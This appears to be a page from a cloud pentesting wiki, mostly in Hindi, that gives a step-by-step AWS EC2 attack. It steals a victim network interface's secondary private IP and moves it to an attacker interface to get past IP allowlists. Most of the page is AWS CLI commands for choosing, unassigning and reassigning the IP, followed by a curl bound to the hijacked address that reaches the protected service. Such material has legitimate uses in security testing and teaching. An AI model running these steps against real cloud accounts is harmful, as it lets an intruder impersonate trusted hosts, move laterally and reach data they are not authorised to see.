# AWS – EC2 ENI Secondary Private IP Hijack (Trust/Allowlist Bypass)

{{#include ../../../../banners/hacktricks-training.md}}

किसी पीड़ित ENI की secondary private IP चुराने और उसे उसी subnet/AZ में किसी attacker ENI पर स्थानांतरित करने के लिए `ec2:UnassignPrivateIpAddresses` और `ec2:AssignPrivateIpAddresses` का दुरुपयोग करें। कई internal सेवाएँ और security groups विशिष्ट private IPs के द्वारा एक्सेस को सीमित करते हैं। उस secondary पते को स्थानांतरित करके, attacker L3 पर trusted host का impersonate कर सकता है और allowlisted सेवाओं तक पहुँच बना सकता है।

पूर्व आवश्यकताएँ:
- अनुमतियाँ: `ec2:DescribeNetworkInterfaces`, `ec2:UnassignPrivateIpAddresses` victim ENI ARN पर, और `ec2:AssignPrivateIpAddresses` attacker ENI ARN पर।
- दोनों ENIs उसी subnet/AZ में होने चाहिए। लक्षित पता एक secondary IP होना चाहिए (primary को unassign नहीं किया जा सकता)।

Variables:
- REGION=us-east-1
- VICTIM_ENI=<eni-xxxxxxxx>
- ATTACKER_ENI=<eni-yyyyyyyy>
- PROTECTED_SG=<sg-protected>   # SG on a target service that allows only $HIJACK_IP
- PROTECTED_HOST=<private-dns-or-ip-of-protected-service>

कदम:
1) पीड़ित ENI से एक secondary IP चुनें
```bash
aws ec2 describe-network-interfaces --network-interface-ids $VICTIM_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[?Primary==`false`].PrivateIpAddress --output text | head -n1 | tee HIJACK_IP
export HIJACK_IP=$(cat HIJACK_IP)
```
2) सुनिश्चित करें कि protected host केवल उस IP को अनुमति देता है (idempotent)। यदि इसके बजाय SG-to-SG नियमों का उपयोग कर रहे हैं, तो छोड़ दें।
```bash
aws ec2 authorize-security-group-ingress --group-id $PROTECTED_SG --protocol tcp --port 80   --cidr "$HIJACK_IP/32" --region $REGION || true
```
3) बेसलाइन: attacker instance से, PROTECTED_HOST को request बिना spoofed source के विफल होना चाहिए (उदा., SSM/SSH के माध्यम से)
```bash
curl -sS --max-time 3 http://$PROTECTED_HOST || true
```
4) लक्षित ENI से secondary IP हटाएँ
```bash
aws ec2 unassign-private-ip-addresses --network-interface-id $VICTIM_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
5) attacker ENI को वही IP असाइन करें (AWS CLI v1 पर `--allow-reassignment` जोड़ें)
```bash
aws ec2 assign-private-ip-addresses --network-interface-id $ATTACKER_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
6) सत्यापित करें कि स्वामित्व स्थानांतरित हो गया है
```bash
aws ec2 describe-network-interfaces --network-interface-ids $ATTACKER_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[].PrivateIpAddress --output text | grep -w $HIJACK_IP
```
7) attacker instance से, hijacked IP पर source-bind करें ताकि protected host तक पहुँच सकें (सुनिश्चित करें कि IP OS पर कॉन्फ़िगर किया गया है; अगर नहीं, तो इसे `ip addr add $HIJACK_IP/<mask> dev eth0` से जोड़ें)
```bash
curl --interface $HIJACK_IP -sS http://$PROTECTED_HOST -o /tmp/poc.out && head -c 80 /tmp/poc.out
```
## Impact
- IP allowlists को बायपास करना और VPC के भीतर एक ही subnet/AZ में ENIs के बीच secondary private IPs को स्थानांतरित करके भरोसेमंद होस्ट्स का impersonate करना।
- विशिष्ट source IPs द्वारा एक्सेस को सीमित करने वाली internal services तक पहुँच, जिससे lateral movement और data access सक्षम होते हैं।
